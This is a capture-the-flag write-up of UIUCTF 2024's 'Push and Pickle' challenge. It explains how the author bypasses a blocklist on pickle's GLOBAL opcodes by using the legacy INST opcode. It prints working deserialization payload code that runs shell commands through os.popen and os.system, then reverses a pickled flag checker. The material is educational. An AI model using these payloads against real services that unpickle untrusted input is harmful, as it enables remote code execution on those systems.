href="/ctf-writeups/baby-flagchecker" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 7</span></a><a href="/ctf-writeups/wallfacer" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 8</span></a><a href="/ctf-writeups/imphash" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 9</span></a><a href="/ctf-writeups/diffuse" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 10</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">Greyhats 2024</span><!--[--><a href="/ctf-writeups/proto-grader" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Proto Grader</span></a><a href="/ctf-writeups/hi-doggy" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Hi Doggy</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">UIUCTF 2024</span><!--[--><a aria-current="page" href="/ctf-writeups/push-and-pickle" class="router-link-active router-link-exact-active group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#64A577" stroke-width="2"></path></svg><span class="self-center font-semibold text-primary">Push and Pickle</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">TISC 2023</span><!--[--><a href="/ctf-writeups/disk-archaeology" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 1</span></a><a href="/ctf-writeups/reckless-mistake" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 2</span></a><a href="/ctf-writeups/kpa" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 3</span></a><a href="/ctf-writeups/rubg" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 4</span></a><a href="/ctf-writeups/palindromes-invitation" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 5</span></a><a href="/ctf-writeups/the-chosen-ones" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 6</span></a><a href="/ctf-writeups/devsecmeow" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 7</span></a><a href="/ctf-writeups/blind-sql-injection" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">Level 8</span></a><!--]--></div><div class="w-full flex flex-col mb-5"><span class="opacity-60 ml-9 mb-3">LITCTF 2023</span><!--[--><a href="/ctf-writeups/the-other-obligatory-pyjail" class="group h-12 flex pl-10"><svg width="20" height="16" viewBox="0 0 20 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="mt-[12px] mr-3"><path d="M1 0V3C1 9.62742 6.37258 15 13 15H20" class="transition-colors" stroke="#424242" stroke-width="2"></path></svg><span class="self-center font-semibold group-hover:text-primary">the other obligatory pyjail</span></a><!--]--></div><!--]--></div><div class="dotted-line-vert h-auto mb-10"></div></div><div class="relative flex flex-col items-center break-words max-w-[89rem] mx-auto px-[20.5rem] pt-24 pb-14 max-xl:ml-0 max-xl:pl-12 max-lg:mr-0 max-lg:pr-12 max-md:px-8 max-sm:px-5"><div class="w-full flex flex-col items-start"><span class="text-xl opacity-60 mb-1">07/07/2024</span><h1 class="mb-7">Push and Pickle</h1><div class="markdown mb-7 flex flex-col gap-y-3"><p>I love how there are so many different types of pickles. I tried experimenting with two of them.</p>
<p><code>ncat --ssl push-and-pickle.chal.uiuc.tf 1337</code></p>
</div><div class="flex flex-wrap gap-3"><!--[--><div class="h-9 bg-white rounded-full flex items-center"><i class="material-symbols-outlined text-xl ml-3 mr-2 text-black">help</i><span class="mr-4 text-black font-semibold">misc</span></div><!--]--><div class="h-9 bg-almost-black rounded-full px-5 flex items-center"><span class="mr-4">55 solves</span><span class="opacity-60">468 points</span></div><div class="h-9 bg-almost-black rounded-full flex items-center"><i class="material-symbols-outlined text-xl ml-3 mr-3">person</i><span class="mr-4">by Cameron</span></div></div><div class="w-full flex border border-almost-black-lighter rounded-2.5xl mt-7 mb-9 max-sm:flex-col"><div class="flex-1 flex flex-col gap-y-2 px-6 pt-4 pb-5"><span>Attachments</span><!--[--><a href="https://uiuctf-2024-rctf-challenge-uploads.storage.googleapis.com/uploads/94b6be18d35c08f9a1debad0f7363b2d4aba03010e9b816f4fd7ebdb572f0cc4/Dockerfile" class="underline">Dockerfile</a><a href="https://uiuctf-2024-rctf-challenge-uploads.storage.googleapis.com/uploads/7574993618be07501ddce1ab30a80a83528dc3baa43646220a69f66e965392d4/chal_redacted.py" class="underline">chal_redacted.py</a><!--]--></div><button class="pl-9 pr-10 font-semibold flex items-center border-l border-almost-black-lighter rounded-tr-2.5xl rounded-br-2.5xl transition-colors hover:bg-almost-black active:bg-almost-black-lighter max-sm:border-l-0 max-sm:border-t max-sm:pl-6 max-sm:py-4 max-sm:rounded-tr-none max-sm:rounded-bl-2.5xl"><i class="material-symbols-outlined text-2xl mr-4">download</i> Download all </button></div></div><div id="article" class="markdown w-full flex flex-col gap-y-3 px-4 max-md:px-0"><p>The main challenge file is quite short, as follows:</p>
<pre><code class="language-python">import pickle
import base64
import sys
import pickletools

def check_flag(flag_guess: str):
  """REDACTED FOR PRIVACY"""

cucumber = base64.b64decode(input("Give me your best pickle (base64 encoded) to taste! "))

for opcode, _, _ in pickletools.genops(cucumber):
  if opcode.code == "c" or opcode.code == "\x93":
    print("Eww! I can't eat dill pickles.")
    sys.exit(0)

pickle.loads(cucumber)
</code></pre>
<p>It is clear that the challenge is about exploiting pickle deserialization. Pickles are python objects serialized into a series of bytecode instructions, and by executing the same bytecode the same python object can be reconstructed elsewhere.  Since we're control the pickle that's loaded, we can pretty much execute arbitrary python code, and a quick google search will reveal many possible payloads. Here is an example:</p>
<pre class="named-fence-block"><code class="language-python">import pickle, os, base64

class P(object):
    def __reduce__(self):
        return (os.system, ("ls -l",))

p = pickle.dumps(P())
print(base64.b64encode(p))
</code><div class="named-fence-filename">t.py</div></pre>
<p>We can disassemble the bytecode using the picketools module:</p>
<pre class="named-fence-block"><code class="language-python">import pickletools

...

print(pickletools.dis(p))
</code><div class="named-fence-filename">t.py</div></pre>
<p>The result is as follows:</p>
<pre><code class="language-plaintext">    0: \x80 PROTO      4
    2: \x95 FRAME      32
   11: \x8c SHORT_BINUNICODE 'posix'
   18: \x94 MEMOIZE    (as 0)
   19: \x8c SHORT_BINUNICODE 'system'
   27: \x94 MEMOIZE    (as 1)
   28: \x93 STACK_GLOBAL
   29: \x94 MEMOIZE    (as 2)
   30: \x8c SHORT_BINUNICODE 'ls -l'
   37: \x94 MEMOIZE    (as 3)
   38: \x85 TUPLE1
   39: \x94 MEMOIZE    (as 4)
   40: R    REDUCE
   41: \x94 MEMOIZE    (as 5)
   42: .    STOP
highest protocol among opcodes = 4
</code></pre>
<p>However, in the context of the challenge we’re not allowed to use the <code>c</code> and <code>\x93</code> operations. Looking up the full list of opcodes <a href="https://github.com/python/cpython/blob/main/Lib/pickle.py#L105">on github</a>, we see that these correspond to the <code>GLOBAL</code> and <code>STACK_GLOBAL</code> operations. These operations are what allow us access to the execution context and to import modules, so without them we cannot access any builtin functions or classes.</p>
<p>I checked through the list of opcodes to see if any could be useful, and also read through the <a href="https://github.com/python/cpython/blob/main/Lib/pickletools.py#L1153">pickletools source code</a> where each opcode was well documented. I also looked through the <code>genops</code> function, hoping to find some inconsistencies in the way opcodes were generated compared to how they were evaluated, but there was nothing. I also explored the possibility that there might be inconsistencies across different pickle protocol versions, but it seems to be handled perfectly with backwards compatibility.</p>
<p>Eventually, while looking through how each opcode was implemented I saw the <code>load_inst</code> function:</p>
<pre class="named-fence-block"><code class="language-python">...

    def load_inst(self):
        module = self.readline()[:-1].decode("ascii")
        name = self.readline()[:-1].decode("ascii")
        klass = self.find_class(module, name)
        self._instantiate(klass, self.pop_mark())

...
</code><div class="named-fence-filename">pickle.py</div></pre>
<p>It caught my eye because it called the <code>find_class</code> method used to import stuff from a module, and it's also used by <code>GLOBAL</code> and <code>STACK_GLOBAL</code>. Referring back to its documentation in pickletools basically describes <code>INST</code> as an older opcode which is now replaced by the <code>GLOBAL</code> and <code>OBJ</code> opcodes.</p>
<pre><code class="language-plaintext">INST is followed by two newline-terminated strings, giving a
module and class name ... self.find_class(module, name) is used
to get a class object.

In addition, all the objects on the stack following the topmost
markobject are gathered into a tuple and popped (along with the
topmost markobject), just as for the TUPLE opcode.
</code></pre>
<p>So we can use inst to load whatever function we need and gain arbitrary code execution from there!</p>
<p>Now to craft the payload. My first thought was to call something like <code>__import__("os").popen("&lt;command&gt;").read()</code>. First, we call inst with <code>os</code> as module name, <code>popen</code> as the 'class name', and <code>&lt;command&gt;</code> as the argument. Second, we have to load the <code>getattr</code> function to access the <code>read</code> method. Finally, we add an empty tuple on the stack (since there are no arguments) and invoke the read method using the <code>REDUCE</code> opcode.</p>
<pre class="named-fence-block"><code class="language-python">from pickle import *
import base64

p = PROTO + b'\x04'
p += MARK
p += MARK
p += MARK
p += STRING + b'"cat chal.py"\n'
p += INST + b'os\npopen\n'
p += STRING + b'"read"\n'
p += INST + b'builtins\ngetattr\n'
p += MARK
p += TUPLE
p += REDUCE
p += INST + b'builtins\nprint\n'
p += STOP

print(base64.b64encode(p))
</code><div class="named-fence-filename">s.py</div></pre>
<p>Initially, I submitted the payload with <code>ls</code> as the command, however, seeing no <code>flag.txt</code> file I output the <code>chal.py</code> contents instead, and it is as follows:</p>
<pre class="named-fence-block"><code class="language-python">import pickle
import base64
import sys
import pickletools

def check_flag(flag_guess: str):
  """REDACTED FOR PRIVACY"""

  # What?! How did you find this? Well you won't be able to figure it out from here...
  return pickle.loads(b'\x80\x04\x96+\x00\x00\x00\x00\x00\x00\x00lbp`sg~S:_p\x7fnf\x81yJ\x8bzP\x92\x95\x8cr\x88\x9d\x90\x8c\x7fb\x96\xa0\xa3\x9e\xae^\xa4s\xa5\xa6y}\xc8\x94\x8c' + len(flag_guess).to_bytes(1, 'little') + flag_guess.encode() + b'\x94\x8c\x08builtins\x8c\x03all\x93\x94\x94\x8c\x08builtins\x8c\x04list\x93\x94\x94\x8c\x08builtins\x8c\x03map\x93\x94\x94\x8c\x05types\x8c\x08CodeType\x93\x94(K\x01K\x00K\x00K\x01K\x05KCC&lt;|\x00d\x01\x19\x00t\x00t\x01\x83\x01k\x00o:|\x00d\x02\x19\x00t\x02t\x01|\x00d\x01\x19\x00\x19\x00\x83\x01d\x03|\x00d\x01\x19\x00d\x04\x17\x00\x14\x00\x17\x00d\x05\x16\x00k\x02S\x00(NK\x00K\x01K\x02KaK\xcbt\x8c\x03len\x8c\x01b\x8c\x03ord\x87\x8c\x01x\x85\x8c\x08&lt;pickle&gt;\x8c\x08&lt;pickle&gt;K\x07C\x00tR\x940\x8c\x05types\x8c\x0cFunctionType\x93\x94(h\t}(\x8c\x03len\x8c\x08builtins\x8c\x03len\x93\x94\x94\x8c\x01bh\x01\x8c\x03ord\x8c\x08builtins\x8c\x03ord\x93\x94\x94uN)tR\x8c\x08builtins\x8c\tenumerate\x93\x94\x94h\x00\x85R\x86R\x85R\x85R.')

cucumber = base64.b64decode(input("Give me your best pickle (base64 encoded) to taste! "))

for opcode, _, _ in pickletools.genops(cucumber):
  if opcode.code == "c" or opcode.code == "\x93":
    print("Eww! I can't eat dill pickles.")
    sys.exit(0)

pickle.loads(cucumber)
</code><div class="named-fence-filename">chal.py</div></pre>
<p>So it seems that there is a second part to this challenge - reversing some pickle bytecode. I disassembled it with pickletools.dis and this was the result:</p>
<pre><code class="language-plaintext">    0: \x80 PROTO      4
    2: \x96 BYTEARRAY8 bytearray(b'lbp`sg~S:_p\x7fnf\x81yJ\x8bzP\x92\x95\x8cr\x88\x9d\x90\x8c\x7fb\x96\xa0\xa3\x9e\xae^\xa4s\xa5\xa6y}\xc8')
   54: \x94 MEMOIZE    (as 0)
   55: \x8c SHORT_BINUNICODE 'uiuctf{guess}'
   70: \x94 MEMOIZE    (as 1)
   71: \x8c SHORT_BINUNICODE 'builtins'
   81: \x8c SHORT_BINUNICODE 'all'
   86: \x93 STACK_GLOBAL
   87: \x94 MEMOIZE    (as 2)
   88: \x94 MEMOIZE    (as 3)
   89: \x8c SHORT_BINUNICODE 'builtins'
   99: \x8c SHORT_BINUNICODE 'list'
  105: \x93 STACK_GLOBAL
  106: \x94 MEMOIZE    (as 4)
  107: \x94 MEMOIZE    (as 5)
  108: \x8c SHORT_BINUNICODE 'builtins'
  118: \x8c SHORT_BINUNICODE 'map'
  123: \x93 STACK_GLOBAL
  124: \x94 MEMOIZE    (as 6)
  125: \x94 MEMOIZE    (as 7)
  126: \x8c SHORT_BINUNICODE 'types'
  133: \x8c SHORT_BINUNICODE 'CodeType'
  143: \x93 STACK_GLOBAL
  144: \x94 MEMOIZE    (as 8)
  145: (    MARK
  146: K        BININT1    1
  148: K        BININT1    0
  150: K        BININT1    0
  152: K        BININT1    1
  154: K        BININT1    5
  156: K        BININT1    67
  158: C        SHORT_BINBYTES b'|\x00d\x01\x19\x00t\x00t\x01\x83\x01k\x00o:|\x00d\x02\x19\x00t\x02t\x01|\x00d\x01\x19\x00\x19\x00\x83\x01d\x03|\x00d\x01\x19\x00d\x04\x17\x00\x14\x00\x17\x00d\x05\x16\x00k\x02S\x00'
  220: (        MARK
  221: N            NONE
  222: K            BININT1    0
  224: K            BININT1    1
  226: K            BININT1    2
  228: K            BININT1    97
  230: K            BININT1    203
  232: t            TUPLE      (MARK at 220)
  233: \x8c     SHORT_BINUNICODE 'len'
  238: \x8c     SHORT_BINUNICODE 'b'
  241: \x8c     SHORT_BINUNICODE 'ord'
  246: \x87     TUPLE3
  247: \x8c     SHORT_BINUNICODE 'x'
  250: \x85     TUPLE1
  251: \x8c     SHORT_BINUNICODE '&lt;pickle&gt;'
  261: \x8c     SHORT_BINUNICODE '&lt;pickle&gt;'
  271: K        BININT1    7
  273: C        SHORT_BINBYTES b''
  275: t        TUPLE      (MARK at 145)
  276: R    REDUCE
  277: \x94 MEMOIZE    (as 9)
  278: 0    POP
  279: \x8c SHORT_BINUNICODE 'types'
  286: \x8c SHORT_BINUNICODE 'FunctionType'
  300: \x93 STACK_GLOBAL
  301: \x94 MEMOIZE    (as 10)
  302: (    MARK
  303: h        BINGET     9
  305: }        EMPTY_DICT
  306: (        MARK
  307: \x8c         SHORT_BINUNICODE 'len'
  312: \x8c         SHORT_BINUNICODE 'builtins'
  322: \x8c         SHORT_BINUNICODE 'len'
  327: \x93         STACK_GLOBAL
  328: \x94         MEMOIZE    (as 11)
  329: \x94         MEMOIZE    (as 12)
  330: \x8c         SHORT_BINUNICODE 'b'
  333: h            BINGET     1
  335: \x8c         SHORT_BINUNICODE 'ord'
  340: \x8c         SHORT_BINUNICODE 'builtins'
  350: \x8c         SHORT_BINUNICODE 'ord'
  355: \x93         STACK_GLOBAL
  356: \x94         MEMOIZE    (as 13)
  357: \x94         MEMOIZE    (as 14)
  358: u            SETITEMS   (MARK at 306)
  359: N        NONE
  360: )        EMPTY_TUPLE
  361: t        TUPLE      (MARK at 302)
  362: R    REDUCE
  363: \x8c SHORT_BINUNICODE 'builtins'
  373: \x8c SHORT_BINUNICODE 'enumerate'
  384: \x93 STACK_GLOBAL
  385: \x94 MEMOIZE    (as 15)
  386: \x94 MEMOIZE    (as 16)
  387: h    BINGET     0
  389: \x85 TUPLE1
  390: R    REDUCE
  391: \x86 TUPLE2
  392: R    REDUCE
  393: \x85 TUPLE1
  394: R    REDUCE
  395: \x85 TUPLE1
  396: R    REDUCE
  397: .    STOP
</code></pre>
<p>It seems to be a flag checker, where the check function represented in python bytecode. I reversed the types.CodeType function call:</p>
<pre><code class="language-python">types.CodeType(
  argcount=1,
  posonlyargcount=0,
  kwonlyargcount=0,
  nlocals=1,
  stacksize=5,
  flags=67,
  code=b'|\x00d\x01\x19\x00t\x00t\x01\x83\x01k\x00o:|\x00d\x02\x19\x00t\x02t\x01|\x00d\x01\x19\x00\x19\x00\x83\x01d\x03|\x00d\x01\x19\x00d\x04\x17\x00\x14\x00\x17\x00d\x05\x16\x00k\x02S\x00',
  consts=(None, 0, 1, 2, 97, 203),
  names=('len', 'b', 'ord'),
  varnames=('x',),
  filename='&lt;pickle&gt;',
  name='&lt;pickle&gt;',
  firstlineno=7,
  lnotab=b'',
)
</code></pre>
<p>Now I reversed the python bytecode using the <code>dis</code> module:</p>
<pre><code class="language-plaintext">          0 LOAD_FAST                0 (0)
          2 LOAD_CONST               1 (1)
          4 BINARY_SUBSCR
          6 LOAD_GLOBAL              0 (0)
          8 LOAD_GLOBAL              1 (1)
         10 CALL_FUNCTION            1
         12 COMPARE_OP               0 (&lt;)
         14 JUMP_IF_FALSE_OR_POP    58 (to 116)
         16 LOAD_FAST                0 (0)
         18 LOAD_CONST               2 (2)
         20 BINARY_SUBSCR
         22 LOAD_GLOBAL              2 (2)
         24 LOAD_GLOBAL              1 (1)
         26 LOAD_FAST                0 (0)
         28 LOAD_CONST               1 (1)
         30 BINARY_SUBSCR
         32 BINARY_SUBSCR
         34 CALL_FUNCTION            1
         36 LOAD_CONST               3 (3)
         38 LOAD_FAST                0 (0)
         40 LOAD_CONST               1 (1)
         42 BINARY_SUBSCR
         44 LOAD_CONST               4 (4)
         46 BINARY_ADD
         48 BINARY_MULTIPLY
         50 BINARY_ADD
         52 LOAD_CONST               5 (5)
         54 BINARY_MODULO
         56 COMPARE_OP               2 (==)
         58 RETURN_VALUE
</code></pre>
<p>So decompiling by hand, this function roughly corresponds to the following:</p>
<pre><code class="language-python">def f(x):
  if x[0] &lt; len(b):
      return x[1] == (ord(b[x[0]]) + 2 * (x[0] + 97)) % 203
</code></pre>
<p>I then decompiled the rest of the pickle bytecode by hand and this was the result:</p>
<pre><code class="language-python">for i, c in enumerate(b'lbp`sg~S:_p\x7fnf\x81yJ\x8bzP\x92\x95\x8cr\x88\x9d\x90\x8c\x7fb\x96\xa0\xa3\x9e\xae^\xa4s\xa5\xa6y}\xc8'):
    if i &lt; len(b):
        assert c == (ord(b[i]) + 2 * (i + 97)) % 203
</code></pre>
<p>So it's quite a straightforward flag checker, I quickly threw together the following script to solve for the flag:</p>
<pre class="named-fence-block"><code class="language-python">flag = ''

for i, c in enumerate(b'lbp`sg~S:_p\x7fnf\x81yJ\x8bzP\x92\x95\x8cr\x88\x9d\x90\x8c\x7fb\x96\xa0\xa3\x9e\xae^\xa4s\xa5\xa6y}\xc8'):
    j = 1
    possible = ''
    decoded_c = c + j*203 - 2*(i+97)
    while decoded_c &lt; 128:
        possible += chr(decoded_c) + ' '
        decoded_c = c + j*203 - 2*(i+97)
        j += 1
    flag += possible[0]
    print(possible)

print(flag)
</code><div class="named-fence-filename">s2.py</div></pre>
<p>This gave the flag:</p>
<p><code>uiuctf{N3Ver_Und3r_3stiMate_P1ckles!e2ba24}</code></p>
<p>Overall, the main difficulty in the challenge for me was finding the <code>INST</code> opcode as the second reversing part was relatively straightforward. I learned quite a bit about pickle bytecode through this, including how frames work and the differences between protocol versions.</p>
</div><div class="fixed w-[17.5rem] h-full top-0 right-0 pointer-events-none pr-8 max-lg:hidden"><!----></div></div><!----></div></div>
    
  

</body></html>